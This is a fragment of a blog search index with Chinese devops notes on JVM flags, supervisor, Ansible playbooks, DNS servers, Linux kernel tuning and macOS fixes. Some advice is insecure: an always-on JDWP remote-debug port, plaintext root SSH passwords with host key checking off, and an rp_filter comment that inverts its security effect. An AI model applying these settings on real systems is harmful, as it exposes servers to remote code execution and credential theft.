","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:3:1","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#jvm-内存配置"},{"categories":["blog"],"content":" JVM 其他配置 gc配置 不同的 jvm 版本用不同的 gc 回收. 例如 java8 用 ParallelGC 或者 CMS java8的gc优化, java 11 用 g1, java 17 用 zgc.所以参数也都不一样. 除非根据监控确定了问题, 明确了解决方案, 否则用默认的吧. -XX:-OmitStackTraceInFastThrow 一些 jvm 会优化异常抛出, 但缺少 message 和 stack trace, 所以关闭. -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=6666 远程 debug 连接到 6666 端口. 启用 suspend 是说是否阻塞直到被连接. 除非是 debug 应用启动过程的代码, 否则配置成 n. ","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:3:2","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#jvm-其他配置"},{"categories":["blog"],"content":" 推荐使用 -XX:+UseContainerSupport -XX:InitialRAMPercentage=70.0 -XX:MaxRAMPercentage=70.0 -XX:-OmitStackTraceInFastThrow -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=6666 ","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:3:3","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#推荐使用"},{"categories":["blog"],"content":" 命令","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:4:0","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#命令"},{"categories":["blog"],"content":" Maven 构建 # clean install 清理以前的文件,解决很多问题 # -T 4 4个线程构建 # -T 1C 每个cpu核心1个线程 # 跳过了测试和,不生成javadoc文件 mvn -T 1C clean install -Dmaven.test.skip -Dmaven.javadoc.skip=true ","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:4:1","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#maven-构建"},{"categories":["blog"],"content":" 内存 dump jmap -dump:format=b,file=/tmp/20210107mem.hprof 30699pid ","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:4:2","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#内存-dump"},{"categories":["blog"],"content":" 反编译 jar 包下载 jar 包 Releases · java-decompiler/jd-gui,然后 java -jar jd-gui.1.6.6.jar ","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:4:3","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#反编译-jar-包"},{"categories":["blog"],"content":" 代码配置 如何为SpringBoot应用设置健康检查_Serverless 应用引擎-阿里云帮助中心 ","date":"2023-07-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/:5:0","series":null,"tags":["blog","java"],"title":"java配置和操作","uri":"/posts/%E7%AC%94%E8%AE%B0/java%E9%85%8D%E7%BD%AE%E5%92%8C%E6%93%8D%E4%BD%9C/#代码配置"},{"categories":["blog"],"content":"这里记录一下 supervisor 在 [[笔记/point/linux|linux]] 下的常用配置, 方便复用.","date":"2023-07-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/supervisor%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","supervisor","监控","devops"],"title":"supervisor配置","uri":"/posts/%E7%AC%94%E8%AE%B0/supervisor%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介这里记录一下 supervisor 的常用配置, 方便复用. ","date":"2023-07-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/supervisor%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","supervisor","监控","devops"],"title":"supervisor配置","uri":"/posts/%E7%AC%94%E8%AE%B0/supervisor%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 操作手册安装和基础配置 # 安装 apt install supervisor -y # 加入2个参数,minfds最大文件数,minprocs最大进程数 vim /etc/supervisor/conf.d/supervisord.conf [supervisord] minfds=81920 minprocs=81920 systemctl enable supervisor --now 编辑配置文件 vim /etc/supervisor/conf.d/demo.conf [program:demo] environment=VAR1=\"value1\",VAR2=\"value2\" directory = /root/app_dir command = /xxx/java -jar app.jar # 启动进程数目默认为1 numprocs = 1 # 如果supervisord是root启动的 设置此用户可以管理该program user = root # 程序运行的优先级 默认999 priority = 996 # 随着supervisord 自启动 autostart = true # 子进程挂掉后无条件自动重启 autorestart = true # 子进程启动多少秒之后 状态为running 表示运行成功 startsecs = 20 # 进程启动失败 最大尝试次数 超过将把状态置为FAIL startretries = 3 # 标准输出的文件路径 stdout_logfile = /tmp/demo-supervisor.log # 日志文件最大大小 stdout_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stdout_logfile_backups = 3 # 错误输出的文件路径 stderr_logfile = /tmp/demo-supervisor.log # 日志文件最大大小 stderr_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stderr_logfile_backups = 3 ","date":"2023-07-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/supervisor%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","supervisor","监控","devops"],"title":"supervisor配置","uri":"/posts/%E7%AC%94%E8%AE%B0/supervisor%E9%85%8D%E7%BD%AE/#操作手册"},{"categories":["blog"],"content":" 参考资料 官方文档 ","date":"2023-07-03","objectID":"/posts/%E7%AC%94%E8%AE%B0/supervisor%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","supervisor","监控","devops"],"title":"supervisor配置","uri":"/posts/%E7%AC%94%E8%AE%B0/supervisor%E9%85%8D%E7%BD%AE/#参考资料"},{"categories":["journal"],"content":"2023-07-01 日记","date":"2023-07-01","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-01/","series":null,"tags":["journal"],"title":"2023-07-01","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-01/"},{"categories":["journal"],"content":"#fun 不要憎恨你的敌人, 这会影响你的判断力. ","date":"2023-07-01","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-01/:0:0","series":null,"tags":["journal"],"title":"2023-07-01","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-01/#"},{"categories":["point"],"content":"ansible 是一个远程管理工具. 要点: 开源, 用户量大 基于 ssh, 所以不需要在被控端安装 agent. ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/ansible/:0:0","series":null,"tags":["point","ansible"],"title":"ansible","uri":"/posts/%E7%AC%94%E8%AE%B0/point/ansible/#"},{"categories":["blog"],"content":"[[笔记/point/ansible|ansible]] 的使用记录, 用到的时候能快速重新捡起来..","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","ansible"],"title":"ansible入门教程","uri":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介ansible 的使用记录, 用到的时候能快速重新捡起来.. ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","ansible"],"title":"ansible入门教程","uri":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装配置 安装 apt install ansible sshpass -y 配置主机 vim /etc/ansible/hosts # test组有一台机器,并配置了ssh连接信息 [test] sh-ecs01 ansible_ssh_host=test.kentxxq.com ansible_ssh_user=\"root\" ansible_ssh_pass=\"123456\" ansible_ssh_port=22 vim /etc/ansible/ansible.cfg [defaults] host_key_checking = False #不检测host key.我们采用的是密码访问,所以这么做可以加快速度 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","ansible"],"title":"ansible入门教程","uri":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/#安装配置"},{"categories":["blog"],"content":" 日常操作简单执行命令 ansible test -m shell -a \"ls\" 使用 ansible-playbook playbook.yml 执行脚本, 下面是脚本文件 --- - name: Install remote facts hosts: test vars: test_dir: /tmp/test_dir test_file: /tmp/test.txt # 禁用收集信息，可以加快脚本执行 # gather_facts: false tasks: - name: 先ping一下 ping: - name: echo输出 command: echo 1 - name: 准备工作-创建测试目录 \"{{ test_dir }}\" file: path: \"{{ test_dir }}\" state: directory owner: \"root\" group: \"root\" mode: 0755 # 输出ansible默认采集到的信息 #- name: debug输出ansible默认收集的变量 # debug: # var: ansible_facts - name: 计算剩余内存百分比 debug: msg: \"{{ ansible_facts.memory_mb.nocache.free / ansible_facts.memtotal_mb * 100 }}\" register: memory_usage_percent - name: 拿到register变量 debug: msg: \"{{ memory_usage_percent.msg }}\" - name: 再register一个远程输出 shell: hostname register: hostname_info - name: 拿到hostname_info变量 debug: msg: \"{{ hostname_info.stdout }}\" - name: 创建本地文件 copy: content: \"123\" dest: \"{{ test_file }}\" delegate_to: localhost - name: 传送文件 copy: src: \"{{ test_file }}\" dest: \"{{ test_file }}\" - name: 本地执行命令 local_action: command tar -zcvf /tmp/tmp.tgz /tmp/test.txt # 压缩和解压 - name: \"拷贝代码去到对应目录\" unarchive: src: \"/tmp/tmp.tgz\" dest: \"{{ test_dir }}\" owner: \"root\" group: \"root\" extra_opts: - --strip-components= 1 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","ansible"],"title":"ansible入门教程","uri":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/#日常操作"},{"categories":["blog"],"content":" Role 方案","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog","ansible"],"title":"ansible入门教程","uri":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/#role-方案"},{"categories":["blog"],"content":" 目录结构 root@poc:~/ansible-role# tree . ├── \\ ├── deploy_java_role.yml # 入口文件 ├── inventory │ └── test-hosts # 主机文件 └── roles └── deploy_java_role ├── tasks │ ├── depoly-task.yml # 部署任务 │ ├── init-app-task.yml # 初始化app环境 │ ├── init-system-task.yml # 初始化系统环境 │ ├── main.yml # 主入口 │ └── vars-task.yml # 获取环境变量 ├── templates │ └── supervisor_conf_template.j2 # 模板文件 └── vars └── main.yml # 静态环境变量 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:4:1","series":null,"tags":["blog","ansible"],"title":"ansible入门教程","uri":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/#目录结构"},{"categories":["blog"],"content":" 调用方法 # 部署到了 deploy-task 阶段会报错,因为并没有 java 包,也没有 jenkins. 但是思路是一致的. 从本地 copy 构建物到目标机器. # 指定role文件,-i指定hosts文件,然后外部传入参数 ansible-playbook deploy_java_role.yml \\ -i inventory/test-hosts \\ --extra-vars \"ip_list=demo_test1\" \\ --extra-vars \"java_params='-Xms256m -Xmx256m'\" \\ --extra-vars \"module_name=name\" \\ --extra-vars \"init=1\" ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:4:2","series":null,"tags":["blog","ansible"],"title":"ansible入门教程","uri":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/#调用方法"},{"categories":["blog"],"content":" 文件内容 # role入口文件 # deploy_java_role.yml --- - hosts: \"{{ ip_list }}\" remote_user: root roles: - role: deploy_java_role serial: 1 max_fail_percentage: 0 # 主机文件 # inventory/test-hosts [demo_test1] sh-ecs01 ansible_ssh_host=1.1.1.1 ansible_ssh_user=\"root\" ansible_ssh_pass=\"123456\" ansible_ssh_port=22 # 主入口 # roles/deploy_java_role/tasks/main.yml --- - name: 构建环境变量 import_tasks: vars-task.yml - name: 初始化环境 import_tasks: init-system-task.yml when: init == \"1\" - name: 应用所需环境 import_tasks: init-app-task.yml when: init == \"1\" - name: 部署脚本 import_tasks: depoly-task.yml # 获取环境变量 # roles/deploy_java_role/tasks/vars-task.yml - name: 获取workspace变量 debug: msg: \"{{ lookup('env', 'WORKSPACE')}}\" register: JenkinsWorkspace #failed_when: JenkinsWorkspace.msg == '' # 初始化系统环境 # roles/deploy_java_role/tasks/init-system-task.yml - name: 安装Supervisor启动管理程序 package: name: supervisor state: present - name: 开机自启supervisor service: name: supervisor enabled: yes - name: 创建程序运行目录 \"{{ program_dir }}\" file: path: \"{{ program_dir }}\" state: directory owner: \"{{ appuser }}\" group: \"{{ appuser }}\" mode: 0755 - name: 创建程序备份目录 \"{{ program_dir_backup }}\" file: path: \"{{ program_dir_backup }}\" state: directory owner: \"{{ appuser }}\" group: \"{{ appuser }}\" mode: 0755 - name: 创建程序运行日志目录 \"{{ program_dir_logs }}\" file: path: \"{{ program_dir_logs }}\" state: directory owner: \"{{ appuser }}\" group: \"{{ appuser }}\" mode: 0755 - name: 创建程序运行临时目录 \"{{ program_dir_tmp }}\" file: path: \"{{ program_dir_tmp }}\" state: directory owner: \"{{ appuser }}\" group: \"{{ appuser }}\" mode: 0755 - name: 启动supervisor service: name: supervisor state: started # 初始化app环境 # roles/deploy_java_role/tasks/init-app-task.yml - name: 判断启动文件 \"{{ module_name }}\".ini是否存在 stat: path: /etc/supervisor/conf.d/{{ module_name }}.conf register: init_file - name: 如果启动文件不存在就拷贝一份启动模板文件 \"{{ module_name }}\".ini 到目标主机 template: src: supervisor_conf_template.j2 dest: /etc/supervisor/conf.d/{{ module_name }}.conf when: init_file.stat.exists == false - name: 更新supervisor shell: supervisorctl update when: init_file.stat.exists == false # 部署任务 # roles/deploy_java_role/tasks/depoly-task.yml - name: \"获取当前时间\" shell: date +%F_%H%M%S register: date_result - name: \"获取{{ module_name }}构建物的名称\" find: paths: - \"{{ JenkinsWorkspace.msg }}/deploy/target\" file_type: file use_regex: yes patterns: \".*{{ module_name }}((?!sources).)*.jar$\" recurse: no register: artcraft delegate_to: localhost - name: \"判断构建物是否存在，不存在则退出\" fail: msg: \"{{ module_name }}.jar is not find\" when: artcraft.matched == 0 - name: \"复制Jenkins构建物{{ module_name }}到对应服务器的指定目录\" copy: src: \"{{ item.path }}\" dest: \"{{ program_dir_tmp }}/{{ module_name }}.jar\" owner: \"{{ appuser }}\" group: \"{{ appuser }}\" mode: \"0644\" force: yes #backup: yes with_items: \"{{ artcraft.files }}\" - name: 注册.部署前.程序运行状况并注册状态 shell: ps -ef | grep {{ module_name }} | grep {{ appuser }} | awk '{print $2}' ignore_errors: True register: artcraft_status - name: 回显并注册当前进程PID信息 debug: var: artcraft_status.stdout_lines[0] verbosity: 0 when: artcraft_status.stdout_lines[1] is defined - name: 提示当前进程没有运行 debug: msg: \"当前用户服务进程没有运行...部署继续...\" when: artcraft_status.stdout_lines[1] is undefined - name: 停止{{ module_name }}对应的服务 command: supervisorctl stop {{ module_name }} when: artcraft_status.stdout_lines[1] is defined register: artcraft_stop_status - name: 回显当前程序状态是否停止成功 debug: var: artcraft_stop_status verbosity: 0 when: artcraft_status.stdout_lines[1] is defined - name: 注册.部署前.最新软件包的地址 shell: ls -lt {{ program_dir_tmp }} | grep {{ module_name }} | head -n 1 |awk '{print $9}' ignore_errors: True register: artcraft_file - name: 回显当前程序artcraft_file信息 debug: var: artcraft_file verbosity: 0 - name: 备份并复制{{ module_name }}的构建物到指定目录 copy: src: \"{{ program_dir_tmp }}/{{ artcraft_file.stdout }}\" dest: \"{{ program_dir }}/{{ appuser }}/{{ module_name }}.jar\" owner: \"{{ appuser }}\" group: \"{{ appuser }}\" mode: \"0644\" backup: yes remote_src: yes - name: 启动{{ module_name }}服务 command: supervisorctl start {{ module_name }} reg","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:4:3","series":null,"tags":["blog","ansible"],"title":"ansible入门教程","uri":"/posts/%E7%AC%94%E8%AE%B0/ansible%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/#文件内容"},{"categories":["blog"],"content":"经常要去网上查, 对比一些 dns 的信息. 记录一下, 以后直接用就行了.","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/dns%E5%88%97%E8%A1%A8/","series":null,"tags":["blog","dns"],"title":"dns列表","uri":"/posts/%E7%AC%94%E8%AE%B0/dns%E5%88%97%E8%A1%A8/"},{"categories":["blog"],"content":" 简介经常要去网上查, 对比一些 dns 的信息. 记录一下, 以后直接用就行了. ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/dns%E5%88%97%E8%A1%A8/:1:0","series":null,"tags":["blog","dns"],"title":"dns列表","uri":"/posts/%E7%AC%94%E8%AE%B0/dns%E5%88%97%E8%A1%A8/#简介"},{"categories":["blog"],"content":" dns 的配置收集 ## 阿里云 https://www.alidns.com/ 223.5.5.5、223.6.6.6、2400:3200::1、2400:3200:baba::1 开手动模板 https://dns.alidns.com/dns-query DoH/DoT地址: dns.alidns.com ## 谷歌 https://developers.google.com/speed/public-dns/docs/doh 8.8.8.8 / 8.8.4.4 2001:4860:4860::8888 2001:4860:4860::8844 2001:4860:4860:0:0:0:0:8888 2001:4860:4860:0:0:0:0:8844 开自动模板 https://dns.google/dns-query ## 腾讯 https://www.dnspod.cn/Products/publicdns 很全 119.29.29.29 开手动模板 https://doh.pub/dns-query 支持dot，地址是dot.pub ## cloudflare 1.1.1.1 1.0.0.1 2606:4700:4700::1111 2606:4700:4700::1001 https://cloudflare-dns.com/dns-query ## 欧盟的dns 193.110.81.0 185.253.5.0 严格过滤 193.110.81.9 185.253.5.9 儿童版 193.110.81.1 185.253.5.1 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/dns%E5%88%97%E8%A1%A8/:2:0","series":null,"tags":["blog","dns"],"title":"dns列表","uri":"/posts/%E7%AC%94%E8%AE%B0/dns%E5%88%97%E8%A1%A8/#dns-的配置收集"},{"categories":["blog"],"content":"这里记录我调整过的 [[linux]] 内核参数.","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0%E8%B0%83%E6%95%B4/","series":null,"tags":["blog","linux"],"title":"linux内核参数调整","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0%E8%B0%83%E6%95%B4/"},{"categories":["blog"],"content":" 简介这里记录我调整过的 linux 内核参数. ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0%E8%B0%83%E6%95%B4/:1:0","series":null,"tags":["blog","linux"],"title":"linux内核参数调整","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0%E8%B0%83%E6%95%B4/#简介"},{"categories":["blog"],"content":" 内核参数调整内核参数的相关配置: /etc/sysctl.conf : 需要调整的配置文件 sysctl -p: 改了配置后立即生效 sysctl -a: 查看内核参数 复制使用 # 系统所有的进程能打开的最大文件数 (文件描述符) # fs.file-max = 9223372036854775807 # 单个进程可以打开的最大文件数 # fs.nr_open = 1048576 # 禁用内存交换 vm.swappiness = 0 # 无法操作的情况下, 进行重启/刷新磁盘 kernel.sysrq = 1 # 一定时间内没收到 arp 广播, 就删除 mac 和 ip 的匹配信息 net.ipv4.neigh.default.gc_stale_time = 120 # 阿里云负载均衡用到 https://help.aliyun.com/knowledge_detail/39428.html # 关闭源地址验证,防止ip欺骗 net.ipv4.conf.all.rp_filter = 0 net.ipv4.conf.eth0.rp_filter = 0 net.ipv4.conf.default.rp_filter = 0 # 发送arp请求的时候,使用目标ip作为源ip net.ipv4.conf.default.arp_announce = 2 net.ipv4.conf.lo.arp_announce = 2 net.ipv4.conf.all.arp_announce = 2 # see details in https://help.aliyun.com/knowledge_detail/41334.html # 服务端主动关闭连接后,会处于TIME_WAIT状态,设置可以保留5000等待.默认太大了,会占资源.太小影响复用. net.ipv4.tcp_max_tw_buckets = 5000 # 安全,导致恶意攻击者无法响应或误判 net.ipv4.tcp_syncookies = 1 # 3次握手等待最后一次响应的时候,这个等待队列的大小 net.ipv4.tcp_max_syn_backlog = 1024 # SYN_RECV状态时重传SYN+ACK包的次数 net.ipv4.tcp_synack_retries = 2 # TCP空闲一段时间后,会较小窗口发送数据,然后再放大窗口. 0代表立即最大窗口发送数据 net.ipv4.tcp_slow_start_after_idle = 0 # 避免频繁连接造成大量TIME-WAIT,复用TIME-WAIT状态的TCP连接, net.ipv4.tcp_tw_reuse = 1 # 关闭连接以后,内核60秒后释放相关资源 net.ipv4.tcp_fin_timeout = 60 # nat环境下多个机器同一个出口ip,可能会导致tcp连接被丢弃.这里关闭时间验证,响应所有的tcp请求. net.ipv4.tcp_timestamps = 0 # 3次握手时,会将信息保存到服务器队列里.每个端口的队列有60000个位置 net.core.somaxconn=60000 # 4.12内核版本开始移除了tcp_tw_recycle配置 # 不适用于NAT！！！！！！ # 快速回收tcp，减少TIME-WAIT。 # net.ipv4.tcp_tw_recycle = 1 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0%E8%B0%83%E6%95%B4/:2:0","series":null,"tags":["blog","linux"],"title":"linux内核参数调整","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0%E8%B0%83%E6%95%B4/#内核参数调整"},{"categories":["blog"],"content":"用 iPhone 拍出来的照片，传到 [[macos|mac]] 上显示结尾是 HEIC 的图片文件。在 markdown 中不支持，同样在 [[hugo]] 的 web 页面里也不支持。所以找了一下方法，发现 automator 这个功能可以一劳永逸的实现。之前一直没有用过。所以记录一下","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/mac-heic%E8%BD%ACjpg%E6%88%96png/","series":null,"tags":["blog","macos"],"title":"mac-HEIC转JPG或PNG","uri":"/posts/%E7%AC%94%E8%AE%B0/mac-heic%E8%BD%ACjpg%E6%88%96png/"},{"categories":["blog"],"content":" 简介用 iPhone 拍出来的照片，传到 macos 上显示结尾是 HEIC 的图片文件。在 markdown 中不支持，同样在 hugo 的 web 页面里也不支持。所以找了一下方法，发现 automator 这个功能可以一劳永逸的实现。之前一直没有用过。所以记录一下 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/mac-heic%E8%BD%ACjpg%E6%88%96png/:1:0","series":null,"tags":["blog","macos"],"title":"mac-HEIC转JPG或PNG","uri":"/posts/%E7%AC%94%E8%AE%B0/mac-heic%E8%BD%ACjpg%E6%88%96png/#简介"},{"categories":["blog"],"content":" 操作手册 Command+Space(空格)，输入 automator,进入后点击新建文稿。 选择快速操作 把左边的步骤拖动到右边，调整后的页面如下 左上角文件 -\u003e存储 -\u003e保存名字 HEIC 转 JPEG 即可 在访达中使用即可 快去看看你的桌面上出现了什么！ ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/mac-heic%E8%BD%ACjpg%E6%88%96png/:2:0","series":null,"tags":["blog","macos"],"title":"mac-HEIC转JPG或PNG","uri":"/posts/%E7%AC%94%E8%AE%B0/mac-heic%E8%BD%ACjpg%E6%88%96png/#操作手册"},{"categories":["point"],"content":"macos 是苹果公司的电脑搭载的操作系统. 因为是苹果 mac 的专属系统, 日常 mac 也代表了 macos. 要点: 苹果专属系统 可以开发 ios 应用 ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/macos/:0:0","series":null,"tags":["point","macos"],"title":"macos","uri":"/posts/%E7%AC%94%E8%AE%B0/point/macos/#"},{"categories":["blog"],"content":"这里记录在使用 [[笔记/point/macos|macos]] 过程中遇到的问题.","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/"},{"categories":["blog"],"content":" 简介这里记录在使用 macos 过程中遇到的问题. ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:1:0","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#简介"},{"categories":["blog"],"content":" 问题列表","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:2:0","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#问题列表"},{"categories":["blog"],"content":" 显示隐藏文件 # 显示 defaults write com.apple.finder AppleShowAllFiles -bool true # 隐藏 defaults write com.apple.finder AppleShowAllFiles -bool false ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:2:1","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#显示隐藏文件"},{"categories":["blog"],"content":" 启用 ftp mac 下一般用 smb 服务来进行远程文件访问，但要用 FTP 的话，高版本的 mac os 默认关掉了，可以用如下命令打开: # 开启 sudo -s launchctl load -w /System/Library/LaunchDaemons/ftp.plist # 关闭 sudo -s launchctl unload -w /System/Library/LaunchDaemons/ftp.plist ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:2:2","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#启用-ftp"},{"categories":["blog"],"content":" Chrome 无法自动更新 # 这里是删除用户文件夹下面的google还有根目录下面的文件google文件夹，应该是会重新下载新的部分模块。同时也可以正常启用为所有用户更新chrome sudo rm -rf /Library/Google \u0026\u0026 sudo rm -rf ~/Library/Google ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:2:3","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#chrome-无法自动更新"},{"categories":["blog"],"content":" 修改主机名 sudo -scutil --set HostName 'kentxxq’s MacBook Pro' ","date":"2023-07-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/:2:4","series":null,"tags":["blog","macos"],"title":"macos问题处理","uri":"/posts/%E7%AC%94%E8%AE%B0/macos%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/#修改主机名"},{"categories":["blog"],"content":" 启用 root # 启用root用户并且创建密码 sudo -i 